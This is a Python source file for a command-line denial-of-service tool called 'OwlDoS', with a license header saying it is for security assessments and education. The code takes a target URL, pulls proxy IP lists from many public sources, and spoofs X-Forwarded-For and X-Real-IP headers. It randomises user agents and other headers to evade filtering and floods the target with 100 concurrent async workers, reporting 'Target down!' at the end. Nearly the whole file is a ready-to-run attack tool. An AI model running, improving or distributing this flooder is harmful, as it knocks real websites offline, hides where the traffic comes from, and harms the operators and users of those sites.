# © 2026 Venex. All rights reserved.
# All rights to the software, source code, documentation, and associated files are owned by Venex.
# Terms of Use: Use of these tools is authorized strictly for security assessments and educational purposes.
# Any misuse, especially for illegal activities, is strictly prohibited.
# The author assumes no liability for damages resulting from the use of these tools.
# Distribution: Unauthorized reproduction, modification, or redistribution of this software without explicit written permission from Venex is prohibited. 


import webbrowser
import os
import shutil
import sys
import asyncio
import aiohttp
import random
import re
import itertools
import string
import time
import requests
from rich.table import Table

PURPLE = '\033[95m'
RESET = '\033[0m'
os.system("title OwlNetV1 - OwlDoS")

UA_GIST_URL = "https://gist.githubusercontent.com/eteubert/1dd9692d4dfa2548fbfb550782daa95e/raw/user_agents.csv"

def load_user_agents():
    try:
        r = requests.get(UA_GIST_URL, timeout=15)
        r.raise_for_status()
        return [ua.strip() for ua in r.text.splitlines() if ua.strip()]
    except Exception as e:
        print(f"[!] Failed to load user agents: {e}")
        return []

user_agents = load_user_agents()



proxy_sources = [
   
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",

  
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/userxd001/proxy-list/main/http.txt",


    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
]

def loading():
    for _ in range(2):
        os.system('cls' if os.name == 'nt' else 'clear') 
        print(r"""
________          __  ________          _________
\_____  \__  _  _|  | \______ \   ____ /   _____/
 /   |   \ \/ \/ /  |  |    |  \ /  _ \\_____  \ 
/    |    \     /|  |__|    `   (  <_> )        \
\_______  /\/\_/ |____/_______  /\____/_______  /
        \/                    \/              \/ 
             """)
        time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)
timeout = aiohttp.ClientTimeout(total=5)
class CliAttacker:
    """
 ,

    """
    def __init__(self, target_url, num_requests):

        self.target_url = target_url
        self.num_requests = num_requests
        self.max_concurrent = 100
        self.request_limit = 50000000000

    def log(self, message):

        print(message)

    async def fetch_ip_addresses(self, url):



        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            try:
                   async with session.get(url, timeout=5) as response: 
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log(f"Failed to fetch IPs from {url}: {e}")
                return []

    async def get_all_ips(self):

        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(500)])
        return all_ips

    async def send_request(self, session, ip_address):

        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address,
            "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
            "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
            "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
            "Cache-Control": "no-cache",
            "Connection": random.choice(["keep-alive", "close"]),
            "X-Real-IP": ip_address,
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", self.target_url, "https://duckduckgo.com"]),
            "Origin": random.choice(["https://example.com", self.target_url, "https://randomsite.com"])
        }
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                print(f"{PURPLE}root@OwlDoS -> {self.target_url} with IP: {ip_address} - Status: {response.status}{RESET}")
        except Exception:
            pass

    async def attack_worker(self, session, ip_cycle, requests_per_worker):

        for _ in range(requests_per_worker):
            await self.send_request(session, next(ip_cycle))
            await asyncio.sleep(1 / self.request_limit)

    async def attack(self):

        ip_list = await self.get_all_ips()
        if not ip_list:
            self.log("No IP list found. Generating random IPs...")
            ip_list = [f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(1000)]
        ip_cycle = itertools.cycle(ip_list)
        requests_per_worker = self.num_requests // self.max_concurrent

        async def worker():
            """Defines a worker session."""
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                await self.attack_worker(session, ip_cycle, requests_per_worker)

        start_time = time.time()
        tasks = [worker() for _ in range(self.max_concurrent)]
        await asyncio.gather(*tasks, return_exceptions=True)
        elapsed_time = time.time() - start_time
        self.log(f"Attack finished in {elapsed_time:.2f} seconds. Target down!")

    def run(self):

        asyncio.run(self.attack())

def print_banner():

    RESET = "\033[0m"
    columns = shutil.get_terminal_size().columns

    banner = r"""
________          __  ________          _________
\_____  \__  _  _|  | \______ \   ____ /   _____/
 /   |   \ \/ \/ /  |  |    |  \ /  _ \\_____  \ 
/    |    \     /|  |__|    `   (  <_> )        \
\_______  /\/\_/ |____/_______  /\____/_______  /
        \/                    \/              \/ 
"""


    start_color = (0, 255, 255)
    end_color = (0, 255, 255)


    def interpolate_color(start, end, factor):
        return tuple(int(start[i] + (end[i] - start[i]) * factor) for i in range(3))

    lines = banner.splitlines()
    total_lines = len(lines)

    for i, line in enumerate(lines):
        factor = i / max(total_lines - 1, 1)  
        r, g, b = interpolate_color(start_color, end_color, factor)
        print(f"\033[38;2;{r};{g};{b}m{line.center(columns)}{RESET}")


if __name__ == "__main__":
    print_banner()
    print("")
    target_url = input("Enter Target URL: ")
    num_requests_str = input("Enter Number of Requests: ")
    try:
        num_requests = int(num_requests_str)
    except ValueError:
        print("Error: Number of requests must be an integer!")
        sys.exit(1)
    if not target_url or num_requests <= 0:
        print("Error: Enter a valid URL and a positive number of requests!")
        sys.exit(1)
    print("\nDoS attack started.")
    print("Attack has begun! Check the logs!\n")
    attacker = CliAttacker(target_url, num_requests)
    attacker.run()